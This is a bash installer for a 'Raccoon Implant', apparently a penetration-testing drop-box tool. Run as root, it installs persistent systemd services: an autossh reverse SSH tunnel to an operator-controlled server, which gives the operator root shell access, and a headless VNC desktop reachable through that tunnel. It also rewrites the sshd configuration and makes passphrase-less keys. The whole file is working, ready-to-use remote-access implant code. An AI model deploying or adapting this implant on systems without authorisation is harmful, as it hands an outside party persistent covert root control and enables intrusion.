#!/bin/bash
# Raccoon Implant — Remote Access installer
#
# Installs and configures:
#   - SSH reverse tunnel (autossh) to an operator-controlled server
#   - VNC server (x11vnc headless) accessible only via the SSH tunnel
#
# Both features read their config from raccoon.yaml and can be
# individually enabled/disabled.
#
# Usage:
#   sudo ./remote_access.sh install          — install + configure everything
#   sudo ./remote_access.sh uninstall        — remove services + keys
#   sudo ./remote_access.sh genkeys          — (re)generate SSH keypair only
#   sudo ./remote_access.sh status           — show service status
#   sudo ./remote_access.sh show-pubkey      — print public key for the operator server
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

INSTALL_DIR="/opt/raccoon"
CONFIG_FILE="${INSTALL_DIR}/configs/raccoon.yaml"
KEY_DIR="${INSTALL_DIR}/.ssh"
KEY_FILE="${KEY_DIR}/raccoon_tunnel"
VNC_PASSWD_FILE="${INSTALL_DIR}/.vnc_passwd"

log()  { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[-]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }

check_root() {
    if [ "$EUID" -ne 0 ]; then
        err "Must run as root (sudo)"
        exit 1
    fi
}

# ── Config parser (minimal YAML → shell) ──

yaml_val() {
    local key="$1"
    grep -E "^\s+${key}:" "$CONFIG_FILE" 2>/dev/null \
        | head -1 \
        | sed 's/.*:\s*//; s/"//g; s/'\''//g; s/#.*//' \
        | xargs
}

yaml_bool() {
    local val
    val=$(yaml_val "$1")
    [[ "$val" =~ ^(true|yes|1)$ ]]
}

load_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        err "Config not found: $CONFIG_FILE"
        exit 1
    fi

    SSH_ENABLED=$(yaml_bool "ssh_enabled" && echo 1 || echo 0)
    SSH_REMOTE_HOST=$(yaml_val "ssh_remote_host")
    SSH_REMOTE_PORT=$(yaml_val "ssh_remote_port")
    SSH_REMOTE_USER=$(yaml_val "ssh_remote_user")
    SSH_TUNNEL_PORT=$(yaml_val "ssh_tunnel_port")
    SSH_LOCAL_PORT=$(yaml_val "ssh_local_port")
    SSH_KEY_TYPE=$(yaml_val "ssh_key_type")

    VNC_ENABLED=$(yaml_bool "vnc_enabled" && echo 1 || echo 0)
    VNC_PORT=$(yaml_val "vnc_port")
    VNC_PASSWORD=$(yaml_val "vnc_password")
    VNC_RESOLUTION=$(yaml_val "vnc_resolution")

    # Defaults
    SSH_REMOTE_PORT="${SSH_REMOTE_PORT:-22}"
    SSH_REMOTE_USER="${SSH_REMOTE_USER:-raccoon}"
    SSH_TUNNEL_PORT="${SSH_TUNNEL_PORT:-2222}"
    SSH_LOCAL_PORT="${SSH_LOCAL_PORT:-22}"
    SSH_KEY_TYPE="${SSH_KEY_TYPE:-ed25519}"
    VNC_PORT="${VNC_PORT:-5900}"
    VNC_PASSWORD="${VNC_PASSWORD:-raccoon}"
    VNC_RESOLUTION="${VNC_RESOLUTION:-1024x768}"
}

# ── SSH key generation ──

generate_keys() {
    info "Generating SSH keypair (${SSH_KEY_TYPE})"

    mkdir -p "$KEY_DIR"
    chmod 700 "$KEY_DIR"

    if [ -f "$KEY_FILE" ]; then
        warn "Existing keypair found — backing up"
        mv "$KEY_FILE" "${KEY_FILE}.bak.$(date +%s)"
        mv "${KEY_FILE}.pub" "${KEY_FILE}.pub.bak.$(date +%s)" 2>/dev/null || true
    fi

    ssh-keygen -t "$SSH_KEY_TYPE" -f "$KEY_FILE" -N "" -C "raccoon-implant@$(hostname)" -q
    chmod 600 "$KEY_FILE"
    chmod 644 "${KEY_FILE}.pub"

    log "Private key: ${KEY_FILE}"
    log "Public key:  ${KEY_FILE}.pub"
    echo ""
    info "Add this public key to the operator server's authorized_keys:"
    echo ""
    echo "  ┌──────────────────────────────────────────────────────────┐"
    echo "  │ $(cat "${KEY_FILE}.pub")"
    echo "  └──────────────────────────────────────────────────────────┘"
    echo ""
    info "On the operator server (${SSH_REMOTE_HOST:-<host>}):"
    echo "  mkdir -p ~/.ssh && echo '$(cat "${KEY_FILE}.pub")' >> ~/.ssh/authorized_keys"
    echo ""
}

# ── SSH reverse tunnel service ──

install_ssh() {
    if [ "$SSH_ENABLED" != "1" ]; then
        warn "SSH reverse tunnel disabled in config — skipping"
        return
    fi

    if [ -z "$SSH_REMOTE_HOST" ]; then
        err "ssh_remote_host not set in config — cannot create tunnel"
        return
    fi

    info "Installing SSH reverse tunnel"

    # Install autossh if not present
    if ! command -v autossh &>/dev/null; then
        log "Installing autossh"
        apt-get install -y -qq autossh openssh-client openssh-server
    fi

    # Generate keys if they don't exist
    if [ ! -f "$KEY_FILE" ]; then
        generate_keys
    fi

    # Enable and harden local sshd
    log "Configuring local SSH daemon"
    if [ -f /etc/ssh/sshd_config ]; then
        # Create raccoon-specific sshd config drop-in
        mkdir -p /etc/ssh/sshd_config.d
        cat > /etc/ssh/sshd_config.d/raccoon.conf <<SSHEOF
# Raccoon Implant — hardened SSH config
Port ${SSH_LOCAL_PORT}
ListenAddress 127.0.0.1
PermitRootLogin prohibit-password
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
ClientAliveInterval 60
ClientAliveCountMax 3
SSHEOF
        log "sshd hardened (key-only, localhost-only on port ${SSH_LOCAL_PORT})"
    fi

    systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
    systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true

    # Create autossh systemd service for reverse tunnel
    log "Creating reverse SSH tunnel service"
    cat > /etc/systemd/system/raccoon-ssh-tunnel.service <<SVCEOF
[Unit]
Description=Raccoon Implant — SSH Reverse Tunnel
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
Environment="AUTOSSH_GATETIME=0"
Environment="AUTOSSH_POLL=60"
Environment="AUTOSSH_PORT=0"
ExecStartPre=/bin/sleep 15
ExecStart=/usr/bin/autossh -M 0 -N -o "ServerAliveInterval=30" -o "ServerAliveCountMax=3" -o "StrictHostKeyChecking=accept-new" -o "ExitOnForwardFailure=yes" -o "ConnectTimeout=10" -i ${KEY_FILE} -R ${SSH_TUNNEL_PORT}:127.0.0.1:${SSH_LOCAL_PORT} ${SSH_REMOTE_USER}@${SSH_REMOTE_HOST} -p ${SSH_REMOTE_PORT}
Restart=always
RestartSec=30

StandardOutput=journal
StandardError=journal
SyslogIdentifier=raccoon-ssh-tunnel

[Install]
WantedBy=multi-user.target
SVCEOF

    systemctl daemon-reload
    systemctl enable raccoon-ssh-tunnel.service 2>/dev/null

    log "SSH reverse tunnel service installed"
    log "  Local sshd:     127.0.0.1:${SSH_LOCAL_PORT}"
    log "  Tunnel:         ${SSH_REMOTE_USER}@${SSH_REMOTE_HOST}:${SSH_REMOTE_PORT}"
    log "  Remote access:  ssh -p ${SSH_TUNNEL_PORT} root@localhost (on operator server)"
}

# ── VNC server ──

install_vnc() {
    if [ "$VNC_ENABLED" != "1" ]; then
        warn "VNC disabled in config — skipping"
        return
    fi

    info "Installing VNC server"

    # Install x11vnc + virtual framebuffer
    local missing=()
    command -v x11vnc &>/dev/null || missing+=(x11vnc)
    command -v Xvfb &>/dev/null || missing+=(xvfb)
    dpkg -l | grep -q "xfce4-session" 2>/dev/null || missing+=(xfce4 xfce4-terminal)

    if [ ${#missing[@]} -gt 0 ]; then
        log "Installing: ${missing[*]}"
        apt-get install -y -qq "${missing[@]}"
    fi

    # Store VNC password
    log "Setting VNC password"
    mkdir -p "$(dirname "$VNC_PASSWD_FILE")"
    x11vnc -storepasswd "$VNC_PASSWORD" "$VNC_PASSWD_FILE" 2>/dev/null
    chmod 600 "$VNC_PASSWD_FILE"

    # Create systemd service for virtual framebuffer
    cat > /etc/systemd/system/raccoon-xvfb.service <<XVFBEOF
[Unit]
Description=Raccoon Implant — Virtual Framebuffer
After=local-fs.target

[Service]
Type=simple
ExecStart=/usr/bin/Xvfb :99 -screen 0 ${VNC_RESOLUTION}x24 -ac
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
XVFBEOF

    # Create systemd service for x11vnc
    cat > /etc/systemd/system/raccoon-vnc.service <<VNCEOF
[Unit]
Description=Raccoon Implant — VNC Server
After=raccoon-xvfb.service
Requires=raccoon-xvfb.service
StartLimitIntervalSec=0

[Service]
Type=simple
Environment="DISPLAY=:99"
ExecStartPre=/bin/sleep 3
ExecStart=/usr/bin/x11vnc -display :99 -rfbport ${VNC_PORT} -rfbauth ${VNC_PASSWD_FILE} -localhost -forever -shared -noxdamage
Restart=always
RestartSec=10

StandardOutput=journal
StandardError=journal
SyslogIdentifier=raccoon-vnc

[Install]
WantedBy=multi-user.target
VNCEOF

    systemctl daemon-reload
    systemctl enable raccoon-xvfb.service 2>/dev/null
    systemctl enable raccoon-vnc.service 2>/dev/null

    log "VNC server installed"
    log "  Display:    :99 (Xvfb ${VNC_RESOLUTION})"
    log "  VNC port:   127.0.0.1:${VNC_PORT} (localhost only)"
    log "  Password:   stored in ${VNC_PASSWD_FILE}"

    if [ "$SSH_ENABLED" = "1" ] && [ -n "$SSH_REMOTE_HOST" ]; then
        echo ""
        info "Access VNC from the operator machine via SSH tunnel:"
        echo "  ssh -p ${SSH_TUNNEL_PORT} -L 5900:127.0.0.1:${VNC_PORT} root@localhost"
        echo "  # then connect VNC viewer to localhost:5900"
    fi
}

# ── Install ──

do_install() {
    check_root
    load_config

    echo -e "${CYAN}"
    echo "  ╔═══════════════════════════════════════╗"
    echo "  ║  Raccoon Implant — Remote Access      ║"
    echo "  ╚═══════════════════════════════════════╝"
    echo -e "${NC}"

    echo "  SSH reverse tunnel: $([ "$SSH_ENABLED" = "1" ] && echo "ENABLED" || echo "disabled")"
    echo "  VNC server:         $([ "$VNC_ENABLED" = "1" ] && echo "ENABLED" || echo "disabled")"
    echo ""

    install_ssh
    echo ""
    install_vnc

    echo ""
    echo "  ════════════════════════════════════════"
    log "Installation complete"
    echo ""

    if [ "$SSH_ENABLED" = "1" ] && [ -n "$SSH_REMOTE_HOST" ]; then
        info "Next steps:"
        echo "  1. Copy the public key to the operator server:"
        echo "     cat ${KEY_FILE}.pub"
        echo ""
        echo "  2. On the operator server (${SSH_REMOTE_HOST}):"
        echo "     # Create the raccoon user (if needed):"
        echo "     useradd -m -s /bin/bash ${SSH_REMOTE_USER}"
        echo "     mkdir -p /home/${SSH_REMOTE_USER}/.ssh"
        echo "     echo '<paste-pubkey>' >> /home/${SSH_REMOTE_USER}/.ssh/authorized_keys"
        echo "     chown -R ${SSH_REMOTE_USER}: /home/${SSH_REMOTE_USER}/.ssh"
        echo ""
        echo "     # Allow reverse tunnel binding in /etc/ssh/sshd_config:"
        echo "     GatewayPorts clientspecified"
        echo ""
        echo "  3. Start the services:"
        echo "     sudo systemctl start raccoon-ssh-tunnel"
        [ "$VNC_ENABLED" = "1" ] && echo "     sudo systemctl start raccoon-vnc"
        echo ""
        echo "  4. Access the implant from the operator machine:"
        echo "     ssh -p ${SSH_TUNNEL_PORT} root@localhost"
        [ "$VNC_ENABLED" = "1" ] && echo "     ssh -p ${SSH_TUNNEL_PORT} -L 5900:127.0.0.1:${VNC_PORT} root@localhost  # VNC tunnel"
    fi
}

# ── Uninstall ──

do_uninstall() {
    check_root
    info "Removing remote access services"

    for svc in raccoon-ssh-tunnel raccoon-vnc raccoon-xvfb; do
        systemctl stop "$svc" 2>/dev/null || true
        systemctl disable "$svc" 2>/dev/null || true
        rm -f "/etc/systemd/system/${svc}.service"
    done
    systemctl daemon-reload

    rm -f /etc/ssh/sshd_config.d/raccoon.conf

    log "Services removed"
    warn "SSH keys preserved in ${KEY_DIR} — delete manually if needed"
    warn "VNC password preserved in ${VNC_PASSWD_FILE} — delete manually if needed"
}

# ── Status ──

do_status() {
    load_config 2>/dev/null || true

    echo ""
    info "Remote Access Status"
    echo "  ───────────────────────────────────────"

    echo ""
    echo "  SSH reverse tunnel:"
    if systemctl is-active --quiet raccoon-ssh-tunnel 2>/dev/null; then
        echo -e "    Service:  ${GREEN}active${NC}"
    elif systemctl is-enabled --quiet raccoon-ssh-tunnel 2>/dev/null; then
        echo -e "    Service:  ${YELLOW}enabled (not running)${NC}"
    else
        echo -e "    Service:  ${RED}not installed${NC}"
    fi
    echo "    Config:   $([ "${SSH_ENABLED:-0}" = "1" ] && echo "enabled" || echo "disabled")"
    echo "    Target:   ${SSH_REMOTE_USER:-?}@${SSH_REMOTE_HOST:-?}:${SSH_REMOTE_PORT:-22}"
    echo "    Tunnel:   remote:${SSH_TUNNEL_PORT:-2222} → local:${SSH_LOCAL_PORT:-22}"
    if [ -f "${KEY_FILE}" ]; then
        echo -e "    Key:      ${GREEN}${KEY_FILE}${NC}"
    else
        echo -e "    Key:      ${RED}not generated${NC}"
    fi

    echo ""
    echo "  VNC server:"
    if systemctl is-active --quiet raccoon-vnc 2>/dev/null; then
        echo -e "    Service:  ${GREEN}active${NC}"
    elif systemctl is-enabled --quiet raccoon-vnc 2>/dev/null; then
        echo -e "    Service:  ${YELLOW}enabled (not running)${NC}"
    else
        echo -e "    Service:  ${RED}not installed${NC}"
    fi
    echo "    Config:   $([ "${VNC_ENABLED:-0}" = "1" ] && echo "enabled" || echo "disabled")"
    echo "    Port:     127.0.0.1:${VNC_PORT:-5900}"
    echo "    Display:  :99 (${VNC_RESOLUTION:-1024x768})"
    echo ""
}

# ── Show public key ──

do_show_pubkey() {
    if [ -f "${KEY_FILE}.pub" ]; then
        echo ""
        cat "${KEY_FILE}.pub"
        echo ""
    else
        err "No public key found. Run: $0 genkeys"
        exit 1
    fi
}

# ── Main ──

case "${1:-}" in
    install)      do_install ;;
    uninstall)    check_root; do_uninstall ;;
    genkeys)      check_root; load_config; generate_keys ;;
    status)       do_status ;;
    show-pubkey)  do_show_pubkey ;;
    *)
        echo "Raccoon Implant — Remote Access Setup"
        echo ""
        echo "Usage: sudo $0 {install|uninstall|genkeys|status|show-pubkey}"
        echo ""
        echo "  install     Install + configure SSH tunnel and VNC"
        echo "  uninstall   Remove services (keeps keys)"
        echo "  genkeys     Generate or rotate SSH keypair"
        echo "  status      Show service status"
        echo "  show-pubkey Print public key for the operator server"
        echo ""
        echo "Configure in: ${CONFIG_FILE}"
        echo "  remote_access.ssh_enabled / vnc_enabled"
        exit 1
        ;;
esac
